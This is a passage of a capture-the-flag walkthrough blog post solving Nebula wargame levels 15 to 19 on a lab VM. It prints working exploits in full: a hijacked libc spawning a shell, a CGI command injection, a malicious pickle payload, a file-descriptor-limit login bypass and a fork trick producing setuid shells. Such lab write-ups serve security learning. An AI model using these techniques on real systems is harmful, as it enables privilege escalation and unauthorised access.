<p>The search term <em>no version information available (required by</em> was the magic that finally got me towards an answer! I came across <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">this</a> and <a href="http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh">this</a> post which talks about custom linking scripts. Basically, if I were to create a file with the contents <code>GLIBC_2.0 {};</code> in it and tell the linker at compile time (with <code>-Wl</code>) about it, then my problem will go away :)</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat version.ld
GLIBC_2.0 {
};</p>

<p>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,&mdash;version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15</p>

<pre><code>linux-gate.so.1 =&gt;  (0x002b3000)
libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00ca0000)
</code></pre>

<p>```</p>

<p>w00t. My <code>ldd</code> Error went away :)</p>

<p><code>bash
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3' not found (required by /var/tmp/flag15/libc.so.6)
</code></p>

<p>Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with <code>-Bstatic</code> and <code>-static-libgcc</code> we tell the compiler not to link against shared libraries. So, I added these too:</p>

<p><code>bash
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
Segmentation fault
</code></p>

<p>And now we are segfaulting. Great! <strong>Not!</strong> I poked around <code>gdb</code> a little and prodded around. Eventually I figured I should check if my <code>__libc_start_main</code> function is being called before the crash:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {</p>

<pre><code>printf("hi mom!\n"); /* Added this line! */
return 0;
</code></pre>

<p>}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,&mdash;version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
hi mom!
Segmentation fault
```</p>

<p>Yes! :D So even though I am causing <code>flag15</code> to crash, I have managed to introduce some code to it. I finally decided to add the <code>system()</code> call and recompile my fake libc.</p>

<p>So, to solve level15:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {</p>

<pre><code>system("/bin/sh");
return 0;
</code></pre>

<p>}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,&mdash;version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level16</h2>

<p><a href="https://exploit-exercises.com/nebula/level16/">Level16&rsquo;s Description</a>:
<blockquote><p>There is a perl script running on port 1616.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Perl program:</p>

<p>```perl index.pl</p>

<h1>!/usr/bin/env perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub login {
  $username = $<em>[0];
  $password = $</em>[1];</p>

<p>  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space</p>

<p>  @output = <code>egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1</code>;
  foreach $line (@output) {</p>

<pre><code>  ($usr, $pw) = split(/:/, $line);


  if($pw =~ $password) {
      return 1;
  }
</code></pre>

<p>  }</p>

<p>  return 0;
}</p>

<p>sub htmlz {
  print(&ldquo;<html><head><title>Login resuls</title></head><body>&rdquo;);
  if($_[0] == 1) {</p>

<pre><code>  print("Your login was accepted&lt;br/&gt;");
</code></pre>

<p>  } else {</p>

<pre><code>  print("Your login failed&lt;br/&gt;");
</code></pre>

<p>  }
  print(&ldquo;Would you like a cookie?<br/><br/></body></html>\n&rdquo;);
}</p>

<p>htmlz(login(param(&ldquo;username&rdquo;), param(&ldquo;password&rdquo;)));
```</p>

<p>This script has a seemingly less obvious command injection vulnerability. The <code>egrep</code> command eventually gets the <code>$username</code> variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.</p>

<p>Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the <code>${A,,}</code> operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable <code>A</code> and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit <code>${A,,}</code> and commented the rest of the line out with a hash (#).</p>

<p>So, to solve level16:</p>

<p>```bash
level16@nebula:~$ vim /var/tmp/flag16.sh
level16@nebula:~$ chmod +x /var/tmp/flag16.sh
level16@nebula:~$ cat /var/tmp/flag16.sh</p>

<h1>!/bin/sh</h1>

<p>gcc /var/tmp/shell.c -o /var/tmp/flag16
chmod 4777 /var/tmp/flag16
```</p>

<p>On my host machine, I requested the web page hosting the perl script, triggering <code>/var/tmp/flag16</code> to run:</p>

<p>```bash
~ » curl -v &ldquo;<a href="http://192.168.217.239:1616/index.cgi?$">http://192.168.217.239:1616/index.cgi?$</a>(python -c &lsquo;import urllib; print urllib.urlencode({ "username&rdquo; : &ldquo;&rdquo;&ldquo;&rdquo;&lt;/etc/passwd;A=&ldquo;/var/tmp/flag16.sh&rdquo;;${A,,};#&ldquo;&rdquo;&ldquo;, "password&rdquo; : &ldquo;a&rdquo; })&rsquo;)&ldquo;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239&hellip;
* Connected to 192.168.217.239 (192.168.217.239) port 1616 (#0)</p>

<blockquote><p>GET /index.cgi?username=%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;password=a HTTP/1.1
User-Agent: curl/7.37.1
Host: 192.168.217.239:1616
Accept: <em>/</em></p>

<ul>
<li>HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Content-type: text/html
&lt;
<html><head><title>Login resuls</title></head><body>Your login failed<br/>Would you like a cookie?<br/><br/></body></html></li>
<li>Closing connection 0
```</li>
</ul>
</blockquote>

<p>And then, just to read the flag:</p>

<p><code>bash
level16@nebula:~$ /var/tmp/flag16
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level17</h2>

<p><a href="https://exploit-exercises.com/nebula/level17/">Level17&rsquo;s Description</a>:
<blockquote><p>There is a python script listening on port 10007 that contains a vulnerability.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Python program:</p>

<p>```perl level17.py</p>

<h1>!/usr/bin/python</h1>

<p>import os
import pickle
import time
import socket
import signal</p>

<p>signal.signal(signal.SIGCHLD, signal.SIG_IGN)</p>

<p>def server(skt):
  line = skt.recv(1024)</p>

<p>  obj = pickle.loads(line)</p>

<p>  for i in obj:</p>

<pre><code>  clnt.send("why did you send me " + i + "?\n")
</code></pre>

<p>skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind((&lsquo;0.0.0.0&rsquo;, 10007))
skt.listen(10)</p>

<p>while True:
  clnt, addr = skt.accept()</p>

<p>  if(os.fork() == 0):</p>

<pre><code>  clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
  server(clnt)
  exit(1)
</code></pre>

<p>```</p>

<p>With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a <code>__reduce__</code> method to pickle and send that over the socket that this code is listening on.</p>

<p>So, to solve level17:</p>

<p>```bash
level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
from netcat import Netcat
import pickle
import os</p>

<p>command = &ldquo;&rdquo;&ldquo;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&rdquo;&ldquo;&rdquo;</p>

<h1>setup the pickle</h1>

<p>class DoCmd(object):</p>

<pre><code>def __reduce__(self):
    return (os.system, ('{cmd}'.format(cmd = command),))
</code></pre>

<p>nc =  Netcat(&lsquo;127.0.0.1&rsquo;, 10007)
nc.read()
nc.write(pickle.dumps(DoCmd()))
nc.close()</p>

<p>level17@nebula:/var/tmp/flag17-prep$ python sploit.py
level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level18</h2>

<p><a href="https://exploit-exercises.com/nebula/level18/">Level18&rsquo;s Description</a>:
<blockquote><p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level18.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;getopt.h></h1>

<p>struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;</p>

<h1>define dprintf(&hellip;) if(globals.debugfile) \</h1>

<p>  fprintf(globals.debugfile, <strong>VA_ARGS</strong>)</p>

<h1>define dvprintf(num, &hellip;) if(globals.debugfile &amp;&amp; globals.verbose >= num) \</h1>

<p>  fprintf(globals.debugfile, <strong>VA_ARGS</strong>)</p>

<h1>define PWFILE &ldquo;/home/flag18/password&rdquo;</h1>

<p>void login(char <em>pw)
{
  FILE </em>fp;</p>

<p>  fp = fopen(PWFILE, &ldquo;r&rdquo;);
  if(fp) {</p>

<pre><code>  char file[64];

  if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf("Unable to read password file %s\n", PWFILE);
      return;
  }
            fclose(fp);
  if(strcmp(pw, file) != 0) return;
</code></pre>

<p>  }
  dprintf(&ldquo;logged in successfully (with%s password file)\n&rdquo;,</p>

<pre><code>  fp == NULL ? "out" : "");
</code></pre>

<p>  globals.loggedin = 1;</p>

<p>}</p>

<p>void notsupported(char <em>what)
{
  char </em>buffer = NULL;
  asprintf(&amp;buffer, &ldquo;&mdash;> [%s] is unsupported at this current time.\n&rdquo;, what);
  dprintf(what);
  free(buffer);
}</p>

<p>void setuser(char *user)
{
  char msg[128];</p>

<p>  sprintf(msg, &ldquo;unable to set user to &lsquo;%s&rsquo; &mdash; not supported.\n&rdquo;, user);
  printf(&ldquo;%s\n&rdquo;, msg);</p>

<p>}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char c;</p>

<p>  while((c = getopt(argc, argv, &ldquo;d:v&rdquo;)) != -1) {</p>

<pre><code>  switch(c) {
      case 'd':
          globals.debugfile = fopen(optarg, "w+");
          if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
          setvbuf(globals.debugfile, NULL, _IONBF, 0);
          break;
      case 'v':
          globals.verbose++;
          break;
  }
</code></pre>

<p>  }</p>

<p>  dprintf(&ldquo;Starting up. Verbose level = %d\n&rdquo;, globals.verbose);</p>

<p>  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());</p>

<p>  while(1) {</p>

<pre><code>  char line[256];
  char *p, *q;

  q = fgets(line, sizeof(line)-1, stdin);
  if(q == NULL) break;
  p = strchr(line, '\n'); if(p) *p = 0;
  p = strchr(line, '\r'); if(p) *p = 0;

  dvprintf(2, "got [%s] as input\n", line);

  if(strncmp(line, "login", 5) == 0) {
      dvprintf(3, "attempting to login\n");
      login(line + 6);
  } else if(strncmp(line, "logout", 6) == 0) {
      globals.loggedin = 0;
  } else if(strncmp(line, "shell", 5) == 0) {
      dvprintf(3, "attempting to start shell\n");
      if(globals.loggedin) {
          execve("/bin/sh", argv, envp);
          err(1, "unable to execve");
      }
      dprintf("Permission denied\n");
  } else if(strncmp(line, "logout", 4) == 0) {
      globals.loggedin = 0;
  } else if(strncmp(line, "closelog", 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
  } else if(strncmp(line, "site exec", 9) == 0) {
      notsupported(line + 10);
  } else if(strncmp(line, "setuser", 7) == 0) {
      setuser(line + 8);
  }
</code></pre>

<p>  }</p>

<p>  return 0;
}
```</p>

<p>Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does <code>execve("/bin/sh", argv, envp);</code>.</p>

<p>I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.</p>

<p>Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is <code>/home/flag18/password</code> and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p</p>

<p>So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a <code>closelog</code> command too. So, I started to play around with <code>ulimit</code>, gradually reducing <code>-n</code> until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.</p>

<p>Without setting the max open files, a sample run would be:</p>

<p>```bash
level18@nebula:~$ touch /tmp/log
level18@nebula:~$ tail -f /tmp/log &amp;
[1] 6499</p>

<p>level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
shell
got [shell] as input
attempting to start shell
Permission denied
```</p>

<p>Dropping the max open files to 4 though, we get:</p>

<p>```bash
level18@nebula:~$ ulimit -n 4</p>

<p>level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
shell
got [shell] as input
attempting to start shell
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```</p>

<p>Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that <code>closelog</code> command that will free up a file descriptor. Rerunning the above but calling <code>closelog</code> before we call <code>shell</code> results in:</p>

<p>```bash
level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] &hellip;</p>

<pre><code>/home/flag18/flag18 [GNU long option] [option] script-file ...
</code></pre>

<p>GNU long options:</p>

<pre><code>--debug
--debugger
--dump-po-strings
--dump-strings
--help
--init-file
--login
--noediting
--noprofile
--norc
--posix
--protected
--rcfile
--restricted
--verbose
--version
</code></pre>

<p>Shell options:</p>

<pre><code>-irsD or -c command or -O shopt_option      (invocation only)
-abefhkmnptuvxBCHP or -o option
</code></pre>

<p>```</p>

<p>Examining the error we get now together with the source code, it was clear that the arguments sent to the <code>flag18</code> binary was also passed to the <code>execve()</code> call. That means that the error is actually sourced from the fact that <code>sh</code> has no <code>-d</code> flag. In fact, one could replicate this error by simply calling <code>sh -d</code>. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the <em>GNU long options</em> are shown. <code>--rcfile</code> seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running <code>flag18</code>:</p>

<p><code>bash
level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: got: command not found
/tmp/log: line 3: attempting: command not found
/tmp/log: line 4: syntax error near unexpected token `('
/tmp/log: line 4: `logged in successfully (without password file)'
</code></p>

<p>The line <code>Starting: command not found</code> was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my <code>PATH</code> and used it to prepare a small SETUID C shell.</p>

<p>So, to solve level18:</p>

<p>```bash
level18@nebula:~$ vim /var/tmp/Starting
level18@nebula:~$ chmod +x /var/tmp/Starting
level18@nebula:~$ cat /var/tmp/Starting</p>

<h1>!/bin/sh</h1>

<p>/bin/sh</p>

<p>level18@nebula:~$ tail -f /tmp/log &amp;
[1] 7627</p>

<p>level18@nebula:~$ Starting up. Verbose level = 3
got [login egg] as input
attempting to login
logged in successfully (without password file)
got [closelog] as input</p>

<p>level18@nebula:~$ export PATH=/var/tmp:$PATH
level18@nebula:~$ ulimit -n 4</p>

<p>level18@nebula:~$ ~flag18/flag18 &mdash;rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option &mdash; &lsquo;&ndash;&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;r&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;c&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;f&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;i&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;l&rsquo;
/home/flag18/flag18: invalid option &mdash; &lsquo;e&rsquo;
tail: /tmp/log: file truncated
Starting up. Verbose level = 3
login egg
got [login egg] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell</p>

<p>sh-4.2$ getflag
sh: start_pipeline: pgrp pipe: Too many open files
You have successfully executed getflag on a target account
```</p>

<h2>level19</h2>

<p><a href="https://exploit-exercises.com/nebula/level19/">Level19&rsquo;s Description</a>:
<blockquote><p>There is a flaw in the below program in how it operates.</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```c level19.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;sys/stat.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;</p>

<p>  /<em> Get the parent&rsquo;s /proc entry, so we can verify its user id </em>/</p>

<p>  snprintf(buf, sizeof(buf)-1, &ldquo;/proc/%d&rdquo;, getppid());</p>

<p>  /<em> stat() it </em>/</p>

<p>  if(stat(buf, &amp;statbuf) == -1) {</p>

<pre><code>  printf("Unable to check parent process\n");
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  /<em> check the owner id </em>/</p>

<p>  if(statbuf.st_uid == 0) {</p>

<pre><code>  /* If root started us, it is ok to start the shell */

  execve("/bin/sh", argv, envp);
  err(1, "Unable to execve");
</code></pre>

<p>  }</p>

<p>  printf(&ldquo;You are unauthorized to run this program\n&rdquo;);
}
```</p>

<p>This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a <code>fork()</code> operation on the <code>flag19</code> binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.</p>

<p>To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can <code>execv()</code> the <code>flag19</code> binary and prepare a shell :)</p>

<p>So, to solve level19:</p>

<p>```bash
level19@nebula:/var/tmp$ vim pwn19.c
level19@nebula:/var/tmp$ cat pwn19.c</p>

<h1>include&lt;stdio.h></h1>

<h1>include&lt;unistd.h></h1>

<p>int main(void) {</p>

<pre><code>pid_t pid = fork();

if (pid == 0) {

    char *arg[] = { "/bin/sh" , "-c" , "gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19" , NULL};
    sleep(2); /* Give the fork 2 sec to orphan */
    execv("/home/flag19/flag19", arg);
    printf("Done fork\n");
    return 0;
}

printf("Done parent\n");
return 0;
</code></pre>

<p>}</p>

<p>level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
level19@nebula:/var/tmp$ ./pwn19
Done parent</p>

<p>level19@nebula:/var/tmp$ /var/tmp/flag19
sh-4.2$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>conclusion</h2>

<p>Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&hellip; ;)</p>

<p>As a final touch, my &lsquo;loot&rsquo; in <code>/var/tmp</code> after finishing the last level:</p>

<p><img class="<a" src="href="https://i.imgur.com/JHZHRJD.png">https://i.imgur.com/JHZHRJD.png</a>"></p>
]]></content>
  </entry>
  
</feed>
